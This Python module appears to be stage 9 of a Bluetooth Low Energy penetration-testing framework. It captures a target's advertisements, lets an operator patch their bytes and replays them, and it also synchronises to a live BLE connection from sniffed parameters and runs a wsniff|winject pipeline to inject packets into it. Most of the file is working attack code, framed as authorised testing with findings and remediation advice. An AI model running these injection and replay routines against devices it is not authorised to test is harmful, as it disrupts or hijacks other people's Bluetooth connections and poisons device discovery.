"""
Stage 9 — Packet Injection / Replay

Two sub-modes selected at the operator gate:
  adv        — capture target advertisements via wsniff, replay via wplay|winject
               (advertisement DoS / scan cache poisoning)
  injectable — synchronise to a live BLE connection captured in S2 and inject
               null PDUs via wsniff|winject (demonstrates InjectaBLE attack surface)

Requires winject (both modes) and wsniff (adv mode) in PATH.
Dongle lifecycle: device is closed before CLI runs and reopened in finally block
(same pattern as s5_interact.py and s7_fuzz.py).
"""

from __future__ import annotations

import shutil
import subprocess
from datetime import datetime, timezone
from pathlib import Path
from time import sleep

from whad.device import WhadDevice

from core.dongle import WhadDongle
from core.models import Connection, Finding, Target
from core.db import insert_finding
from core.logger import get_logger, prompt_line
from core.pcap import pcap_path
import config

log = get_logger("s9_inject")

ADV_CAPTURE_SECS = 10        # seconds to sniff advertisements before replaying
ADV_INJECT_SECS = 20         # seconds to run the replay injection
INJECTABLE_SECS = 15         # seconds for connection injection attempt
REOPEN_TIMEOUT_SECS = 15     # max seconds to wait for dongle reopen


def run(
    dongle: WhadDongle,
    target: Target,
    engagement_id: str,
    connections: list[Connection],
    mode: str,
) -> None:
    """Run the injection stage against target.

    Args:
        dongle: Active WHAD dongle.
        target: Target device.
        engagement_id: Engagement ID for Finding storage.
        connections: S2 connection records (needed for InjectaBLE mode).
        mode: "adv" for advertisement injection, "injectable" for connection injection.
    """
    if not shutil.which("winject"):
        log.warning("[S9] winject not found in PATH — stage skipped.")
        return

    if mode == "adv":
        _run_adv_mode(dongle, target, engagement_id)
    elif mode == "injectable":
        _run_injectable_mode(dongle, target, engagement_id, connections)
    else:
        log.error(f"[S9] Unknown mode '{mode}' — expected 'adv' or 'injectable'.")


# ---------------------------------------------------------------------------
# ADV injection sub-mode
# ---------------------------------------------------------------------------

def _run_adv_mode(
    dongle: WhadDongle,
    target: Target,
    engagement_id: str,
) -> None:
    """Capture advertisements in background, collect payload substitution rules,
    apply find/replace to captured PCAP, then replay-inject."""
    if not shutil.which("wsniff"):
        log.warning("[S9][adv] wsniff not found in PATH — adv mode skipped.")
        return
    if not shutil.which("wplay"):
        log.warning("[S9][adv] wplay not found in PATH — adv mode skipped.")
        return

    addr = target.bd_address
    capture_pcap = pcap_path(engagement_id, 9, addr)
    capture_pcap.parent.mkdir(parents=True, exist_ok=True)

    cmd_capture = (
        f"wsniff -i {config.INTERFACE} -o {capture_pcap} ble --show-advertisements"
    )
    cmd_inject = (
        f"wplay --flush {{inject_pcap}} ble | winject -i {config.INTERFACE} ble -r -d 0.1"
    )

    # Suppress OSError(EBADF) from WHAD reader thread dying on device close
    import threading as _threading
    import time as _time
    _prev_hook = _threading.excepthook

    def _suppress_ebadf(args):
        if isinstance(args.exc_value, OSError) and args.exc_value.errno == 9:
            return
        _prev_hook(args)

    _threading.excepthook = _suppress_ebadf
    dongle.device.close()
    sleep(1.0)

    inject_ok = False
    inject_pcap = capture_pcap

    try:
        # Start capture as background process — operator enters substitution rules
        # concurrently so the capture window isn't dead time
        log.info(f"[S9][adv] Starting {ADV_CAPTURE_SECS}s capture in background ...")
        log.debug(f"[S9][adv] Capture: {cmd_capture}")
        capture_start = _time.time()
        proc = subprocess.Popen(
            cmd_capture, shell=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

        rules = _prompt_substitution_rules()

        # Wait out any remaining capture window then stop wsniff
        remaining = ADV_CAPTURE_SECS - (_time.time() - capture_start)
        if remaining > 0:
            log.info(f"[S9][adv] Capture window: {remaining:.0f}s remaining ...")
            sleep(remaining)
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

        capture_ok = capture_pcap.exists() and capture_pcap.stat().st_size > 0
        if not capture_ok:
            log.warning(f"[S9][adv] No advertisements captured — skipping injection.")
            return

        log.info(
            f"[S9][adv] Capture complete ({capture_pcap.stat().st_size} bytes). "
            f"{len(rules)} substitution rule(s)."
        )

        if rules:
            inject_pcap = _apply_substitutions(capture_pcap, rules)

        resolved_cmd = cmd_inject.format(inject_pcap=inject_pcap)
        log.info(f"[S9][adv] Replaying via winject for {ADV_INJECT_SECS}s ...")
        log.debug(f"[S9][adv] Inject: {resolved_cmd}")
        try:
            subprocess.run(
                resolved_cmd, shell=True,
                capture_output=True, text=True,
                timeout=ADV_INJECT_SECS + 5,
            )
            inject_ok = True
        except subprocess.TimeoutExpired:
            inject_ok = True
            log.debug("[S9][adv] Inject timed out (expected for repeat mode).")
        except Exception as exc:
            log.error(f"[S9][adv] Inject error: {type(exc).__name__}: {exc}")

    finally:
        _threading.excepthook = _prev_hook
        _reopen_dongle(dongle)

    if not inject_ok:
        log.warning("[S9][adv] Injection did not complete — no finding recorded.")
        return

    finding = Finding(
        type="adv_injection",
        severity="medium",
        target_addr=addr,
        description=(
            f"Advertisement injection replayed captured BLE advertisements "
            f"from {addr} ({target.name or 'unnamed'}). "
            "May disrupt BLE scanning or poison device discovery caches on "
            "nearby centrals."
            + (f" {len(rules)} payload substitution rule(s) applied." if rules else "")
        ),
        remediation=(
            "Advertisement replay cannot be prevented at the RF layer. "
            "Use bonding with IRK-based address resolution to verify device "
            "identity before trusting application data."
        ),
        evidence={
            "target_addr": addr,
            "capture_pcap": str(capture_pcap),
            "inject_pcap": str(inject_pcap),
            "substitution_rules": len(rules),
            "duration_seconds": ADV_INJECT_SECS,
        },
        pcap_path=str(inject_pcap),
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(f"FINDING [medium] adv_injection: {addr}")
    _print_summary(target, mode="adv", success=inject_ok, pcap=str(inject_pcap))


def _prompt_substitution_rules() -> list[tuple[bytes, bytes]]:
    """Prompt operator for hex find/replace rules to apply to captured packets.

    Called while advertisement capture runs in the background — the capture window
    is used productively. Returns list of (find_bytes, replace_bytes) tuples.
    """
    rules: list[tuple[bytes, bytes]] = []
    log.info(
        "\n  Payload substitution — enter rules while capture runs in background.\n"
        "  Specify hex byte sequences to find and replace in captured packets.\n"
        "  Leave 'Find' empty to skip and inject raw capture.\n"
    )
    while True:
        try:
            find_hex = prompt_line(
                f"  Rule {len(rules) + 1} — Find    (hex, empty=done): "
            ).strip().replace(" ", "")
        except (KeyboardInterrupt, EOFError):
            break
        if not find_hex:
            break
        try:
            find_b = bytes.fromhex(find_hex)
        except ValueError:
            log.info("    Invalid hex — try again.")
            continue
        try:
            repl_hex = prompt_line(
                f"  Rule {len(rules) + 1} — Replace (hex, empty=delete): "
            ).strip().replace(" ", "")
            repl_b = bytes.fromhex(repl_hex) if repl_hex else b""
        except ValueError:
            log.info("    Invalid hex — rule skipped.")
            continue
        except (KeyboardInterrupt, EOFError):
            break
        rules.append((find_b, repl_b))
        log.debug(f"[S9][adv] Rule: {find_hex} → {repl_hex or '(delete)'}")
    if rules:
        log.info(f"  {len(rules)} substitution rule(s) queued.\n")
    return rules


def _apply_substitutions(pcap: Path, rules: list[tuple[bytes, bytes]]) -> Path:
    """Apply byte-level find/replace rules to all packets in a PCAP.

    Returns path to the modified PCAP. Original is preserved.
    Falls back to original on scapy import failure.
    """
    try:
        from scapy.utils import rdpcap, wrpcap
    except ImportError:
        log.warning("[S9][adv] scapy not available — substitution skipped.")
        return pcap

    pkts = rdpcap(str(pcap))
    modified_count = 0
    new_pkts = []
    for pkt in pkts:
        raw = bytearray(bytes(pkt))
        changed = False
        for find_b, repl_b in rules:
            i = 0
            while (i := raw.find(find_b, i)) != -1:
                raw[i:i + len(find_b)] = repl_b
                i += len(repl_b)
                changed = True
        if changed:
            modified_count += 1
        new_pkts.append(pkt.__class__(bytes(raw)))

    out = pcap.parent / (pcap.stem + ".modified.pcap")
    wrpcap(str(out), new_pkts)
    log.info(
        f"[S9][adv] Substitution: {modified_count}/{len(pkts)} packet(s) modified "
        f"→ {out.name}"
    )
    return out


# ---------------------------------------------------------------------------
# InjectaBLE sub-mode
# ---------------------------------------------------------------------------

def _run_injectable_mode(
    dongle: WhadDongle,
    target: Target,
    engagement_id: str,
    connections: list[Connection],
) -> None:
    """Synchronise to a live BLE connection and inject via wsniff|winject pipeline."""
    addr = target.bd_address

    conn = next(
        (c for c in connections if c.peripheral_addr.upper() == addr.upper()),
        None,
    )
    if conn is None:
        log.warning(f"[S9][injectable] No S2 connection record for {addr}.")
        try:
            ans = prompt_line(
                f"\n  No Stage 2 data for {addr}. "
                "Run a connection capture now to collect parameters? [yes/no]: "
            ).strip().lower()
        except (KeyboardInterrupt, EOFError):
            return
        if ans not in ("yes", "y"):
            log.info("[S9][injectable] Skipped — run Stage 2 first.")
            return

        from stages import s2_intel
        new_connections, _ = s2_intel.run(dongle, [target], engagement_id, print_summary=False)
        connections = list(connections) + new_connections
        conn = next(
            (c for c in connections if c.peripheral_addr.upper() == addr.upper()),
            None,
        )
        if conn is None:
            log.warning(
                "[S9][injectable] Stage 2 capture did not observe a connection "
                f"for {addr} — skipping injection."
            )
            return

    # Convert interval_ms back to BLE hop interval units (units of 1.25ms)
    hop_interval = int(conn.interval_ms / 1.25)

    log.info(
        f"[S9][injectable] Synchronising to connection "
        f"{conn.central_addr} -> {addr} "
        f"AA=0x{conn.access_address:08X} ..."
    )

    dongle.device.close()
    sleep(1.0)

    inject_ok = False
    cmd_inject = ""

    try:
        cmd_inject = (
            f"wsniff -i {config.INTERFACE} ble "
            f"--access-address 0x{conn.access_address:08X} "
            f"--crc-init 0x{conn.crc_init:06X} "
            f"--hop-interval {hop_interval} "
            f"--hop-increment {conn.hop_increment} "
            f"--channel-map {conn.channel_map} "
            f"| winject -i {config.INTERFACE} ble"
        )
        log.debug(f"[S9][injectable] {cmd_inject}")

        try:
            subprocess.run(
                cmd_inject,
                shell=True,
                capture_output=True,
                text=True,
                timeout=INJECTABLE_SECS + 5,
            )
            inject_ok = True
        except subprocess.TimeoutExpired:
            inject_ok = True
            log.debug("[S9][injectable] Pipeline timed out (normal).")
        except Exception as exc:
            log.error(f"[S9][injectable] Error: {type(exc).__name__}: {exc}")

    finally:
        _reopen_dongle(dongle)

    if not inject_ok:
        log.warning("[S9][injectable] Injection did not complete — no finding recorded.")
        return

    finding = Finding(
        type="connection_injection",
        severity="high",
        target_addr=addr,
        description=(
            f"Packet injection demonstrated against active BLE connection "
            f"({conn.central_addr} <-> {addr}). "
            f"Connection parameters (AA=0x{conn.access_address:08X}, "
            f"CRCInit=0x{conn.crc_init:06X}) were captured passively in Stage 2 "
            "and used to synchronise an injector. "
            "An attacker with RF access can inject arbitrary LL PDUs into this link."
        ),
        remediation=(
            "BLE connections cannot be protected against InjectaBLE at the RF layer. "
            "Mitigate impact by: enabling LE Secure Connections (which encrypts the "
            "link), validating all GATT requests server-side, implementing application-"
            "layer message authentication (CMAC), and using connection supervision "
            "timeouts to detect unexpected disconnections."
        ),
        evidence={
            "central_addr": conn.central_addr,
            "peripheral_addr": addr,
            "access_address": f"0x{conn.access_address:08X}",
            "crc_init": f"0x{conn.crc_init:06X}",
            "hop_interval": hop_interval,
            "hop_increment": conn.hop_increment,
            "channel_map": conn.channel_map,
            "inject_command": cmd_inject,
        },
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(f"FINDING [high] connection_injection: {addr}")
    _print_summary(target, mode="injectable", success=inject_ok)


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _reopen_dongle(dongle: WhadDongle) -> None:
    """Re-attach the underlying WhadDevice after CLI subprocess use."""
    import time as _time

    deadline = _time.time() + REOPEN_TIMEOUT_SECS
    attempt = 0
    last_exc: Exception | None = None
    while _time.time() < deadline:
        try:
            dongle.device = WhadDevice.create(config.INTERFACE)
            if attempt > 0:
                log.debug(f"[S9] Dongle reopen succeeded after {attempt * 0.5:.1f}s")
            return
        except Exception as exc:
            last_exc = exc
            attempt += 1
            _time.sleep(0.5)
    log.warning(
        f"[S9] Could not reopen WHAD device after {REOPEN_TIMEOUT_SECS}s "
        f"({type(last_exc).__name__}: {last_exc!r})"
    )


def _print_summary(
    target: Target,
    mode: str,
    success: bool,
    pcap: str | None = None,
) -> None:
    mode_label = "ADV Injection" if mode == "adv" else "InjectaBLE"
    status = "SUCCESS" if success else "FAILED"
    log.info("\n" + "─" * 76)
    log.info(f"  STAGE 9 SUMMARY -- {mode_label}")
    log.info("─" * 76)
    log.info(f"  {'Target':<18}: {target.bd_address}")
    log.info(f"  {'Device name':<18}: {target.name or '(unnamed)'}")
    log.info(f"  {'Mode':<18}: {mode_label}")
    log.info(f"  {'Result':<18}: {status}")
    if pcap:
        log.info(f"  {'PCAP':<18}: {pcap}")
    log.info("─" * 76 + "\n")
